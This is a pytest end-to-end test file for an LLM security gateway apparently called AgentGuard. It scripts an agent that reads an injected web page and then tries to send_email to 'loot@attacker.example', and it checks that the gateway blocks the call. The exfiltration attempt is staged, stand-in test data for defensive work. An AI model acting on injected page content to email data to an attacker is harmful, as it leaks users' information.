"""LLM gateway against a local upstream test server; driven by the real provider SDKs."""

from __future__ import annotations

import json

import httpx
import pytest

from agentguard.core.detectors.heuristic import HeuristicDetector
from agentguard.core.engine import Engine
from agentguard.core.events import MemorySink
from agentguard.core.policy.loader import parse_policy
from agentguard.gateway.auth import StaticKeyAuth, hash_key
from agentguard.gateway.config import LlmConfig
from agentguard.gateway.llm.app import create_app
from tests.e2e.scripted import (
    INJECTED_PAGE,
    USER_TASK,
    ScriptedProvider,
    anthropic_stream_tool_use,
    anthropic_tool_use,
    openai_stream_tool_call,
    openai_tool_call,
)

openai = pytest.importorskip("openai")
anthropic = pytest.importorskip("anthropic")
httpx2 = pytest.importorskip("httpx2")

KEY = "ag_test_" + "k" * 32
POLICY = parse_policy("tools:\n  read_web: {role: source, ref_arg: url}\n  send_email: {role: sink, risk: high}\n")


def make(responses: list, strict: bool = False):  # type: ignore[no-untyped-def]
    provider = ScriptedProvider(responses)
    sink = MemorySink()
    engine = Engine(POLICY, detectors=[HeuristicDetector()], sinks=[sink])
    upstream = httpx.AsyncClient(transport=provider.async_transport())
    app = create_app(
        engine,
        StaticKeyAuth({hash_key(KEY): {"tenant_id": "acme"}}),
        LlmConfig(openai_base_url="http://openai.up", anthropic_base_url="http://anthropic.up", strict=strict),
        client=upstream,
    )
    return app, provider, sink


def openai_client(app, async_: bool = False):  # type: ignore[no-untyped-def]
    transport = httpx.ASGITransport(app=app)
    if async_:
        return openai.AsyncOpenAI(
            api_key="sk-up",
            base_url="http://gw/v1",
            default_headers={"X-AgentGuard-Key": KEY},
            http_client=httpx.AsyncClient(transport=transport),
        )
    return transport


def chat_messages() -> list[dict]:
    return [
        {"role": "user", "content": USER_TASK},
        {
            "role": "assistant",
            "tool_calls": [
                {
                    "id": "c1",
                    "type": "function",
                    "function": {
                        "name": "read_web",
                        "arguments": json.dumps({"url": "https://trails.example/rmnp"}),
                    },
                }
            ],
        },
        {"role": "tool", "tool_call_id": "c1", "content": INJECTED_PAGE},
    ]


async def test_openai_chat_rewrite_and_headers() -> None:
    app, _provider, sink = make([openai_tool_call("send_email", {"to": "loot@attacker.example"})])
    client = openai_client(app, async_=True)
    raw = await client.chat.completions.with_raw_response.create(model="m", messages=chat_messages())
    resp = raw.parse()
    assert resp.choices[0].message.tool_calls is None
    assert "AgentGuard blocked" in resp.choices[0].message.content
    assert raw.headers["x-agentguard-action"] == "BLOCK"
    assert float(raw.headers["x-agentguard-overhead-ms"]) >= 0
    # upstream credentials forwarded, AgentGuard key not
    ev = next(e for e in sink.events if e["type"] == "tool_call")
    assert ev["tenant_id"] == "acme" and ev["source"] == "llm-gateway"


async def test_openai_chat_stream() -> None:
    app, _provider, _ = make([openai_stream_tool_call("send_email", {"to": "loot@attacker.example"})])
    client = openai_client(app, async_=True)
    stream = await client.chat.completions.create(model="m", messages=chat_messages(), stream=True)
    chunks = [c async for c in stream]
    assert not any(c.choices and c.choices[0].delta.tool_calls for c in chunks)
    assert "AgentGuard blocked" in "".join(c.choices[0].delta.content or "" for c in chunks if c.choices)


async def test_strict_mode_403_and_auth() -> None:
    app, _, _ = make([openai_tool_call("send_email", {"to": "loot@attacker.example"})], strict=True)
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://gw") as c:
        r = await c.post(
            "/v1/chat/completions",
            json={"model": "m", "messages": chat_messages()},
            headers={"x-agentguard-key": KEY},
        )
        assert r.status_code == 403 and r.json()["error"]["code"] == "tool_call_blocked"
        assert (await c.post("/v1/chat/completions", json={})).status_code == 401
        assert (
            await c.post("/v1/chat/completions", content=b"{", headers={"x-agentguard-key": KEY})
        ).status_code == 400
        assert (
            await c.post("/v1/responses", json={"stream": True}, headers={"x-agentguard-key": KEY})
        ).status_code == 400
        assert (
            await c.post("/v1/responses", json={"previous_response_id": "r"}, headers={"x-agentguard-key": KEY})
        ).status_code == 400
        assert (await c.get("/healthz")).json()["status"] == "ok"


async def test_upstream_errors_pass_through() -> None:
    app, _provider, _ = make([lambda req: httpx.Response(429, json={"error": {"message": "rate limited"}})])
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://gw") as c:
        r = await c.post(
            "/v1/chat/completions",
            json={"model": "m", "messages": []},
            headers={"x-agentguard-key": KEY, "authorization": "Bearer sk-up"},
        )
    assert r.status_code == 429


async def test_responses_endpoint() -> None:
    resp_json = {
        "id": "r",
        "object": "response",
        "created_at": 1,
        "model": "m",
        "status": "completed",
        "parallel_tool_calls": True,
        "tool_choice": "auto",
        "tools": [],
        "output": [
            {
                "type": "function_call",
                "id": "fc",
                "call_id": "c2",
                "name": "send_email",
                "arguments": json.dumps({"to": "loot@attacker.example"}),
                "status": "completed",
            }
        ],
    }
    app, provider, _ = make([resp_json])
    client = openai_client(app, async_=True)
    out = await client.responses.create(
        model="m",
        input=[
            {"role": "user", "content": USER_TASK},
            {"type": "function_call", "call_id": "c1", "name": "read_web", "arguments": "{}"},
            {"type": "function_call_output", "call_id": "c1", "output": INJECTED_PAGE},
        ],
    )
    assert [o.type for o in out.output] == ["message"]
    assert provider.requests[0]["input"][0]["content"] == USER_TASK


def anthropic_messages() -> list[dict]:
    return [
        {"role": "user", "content": USER_TASK},
        {
            "role": "assistant",
            "content": [
                {
                    "type": "tool_use",
                    "id": "t0",
                    "name": "read_web",
                    "input": {"url": "https://trails.example/rmnp"},
                }
            ],
        },
        {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t0", "content": INJECTED_PAGE}]},
    ]


async def test_anthropic_messages_and_stream() -> None:
    app, provider, _ = make(
        [
            anthropic_tool_use("send_email", {"to": "loot@attacker.example"}),
            anthropic_stream_tool_use("send_email", {"to": "loot@attacker.example"}),
        ]
    )

    # The anthropic SDK uses httpx2; bridge it to the ASGI app through an httpx2 transport.
    asgi = httpx.ASGITransport(app=app)

    async def bridge(request):  # type: ignore[no-untyped-def]
        await request.aread()
        async with httpx.AsyncClient(transport=asgi, base_url="http://gw") as c:
            r = await c.request(
                request.method, str(request.url), headers=dict(request.headers), content=request.content
            )
        return httpx2.Response(r.status_code, headers=dict(r.headers), content=r.content)

    client = anthropic.AsyncAnthropic(
        api_key="sk-ant-up",
        base_url="http://gw",
        default_headers={"X-AgentGuard-Key": KEY},
        http_client=httpx2.AsyncClient(transport=httpx2.MockTransport(bridge)),
    )
    msg = await client.messages.create(model="c", max_tokens=10, messages=anthropic_messages())
    assert msg.stop_reason == "end_turn" and "AgentGuard blocked" in msg.content[-1].text
    stream = await client.messages.create(model="c", max_tokens=10, messages=anthropic_messages(), stream=True)
    events = [e async for e in stream]
    starts = [e for e in events if e.type == "content_block_start"]
    assert [s.content_block.type for s in starts] == ["text", "text"]
    assert next(e for e in events if e.type == "message_delta").delta.stop_reason == "end_turn"
    assert provider.requests[0]["messages"][0]["content"] == USER_TASK
